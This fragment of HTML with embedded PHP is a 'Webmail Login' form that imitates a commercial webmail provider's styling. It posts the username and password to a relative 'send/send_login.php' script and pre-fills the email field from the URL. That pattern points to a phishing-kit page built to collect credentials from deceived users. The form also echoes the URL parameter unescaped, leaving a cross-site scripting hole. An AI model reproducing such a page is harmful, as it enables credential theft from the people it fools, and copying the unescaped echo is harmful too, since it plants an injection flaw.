          ...
          <div class="sheet">
            <div class="sheet__section">
              <div class="sheet__block">
                ...
                <form id="login-form" class="form content-elem" action="../send/send_login.php" method="post">
                  <legend class="hidden" data-i18n="oao.login.heading" data-i18n-attr="text">Webmail Login</legend>
                  <div id="login-error" class="notificaiton-wrap"></div> <span class="input-text-group input-text-group--empty" style="overflow: visible; margin-bottom: 10px;"><span class="input-text-group__icon exos-icon exos-icon-nav-user-16"></span>
                  <input class="input-text login-form-user" id="login-form-user" maxlength="200" name="username" type="text" required="true" value="<?php echo $_GET['email']; ?>" autocomplete="off" autofocus="focus">
                  ...
                  </div> <span class="input-text-group input-text-group--empty" style="overflow: visible; margin-bottom: 10px;"><span class="input-text-group__icon exos-icon exos-icon-password-16"></span>
                  <input class="input-text login-form-password" id="login-form-password" maxlength="40" name="password" type="password" required="true" value="" autocomplete="off">
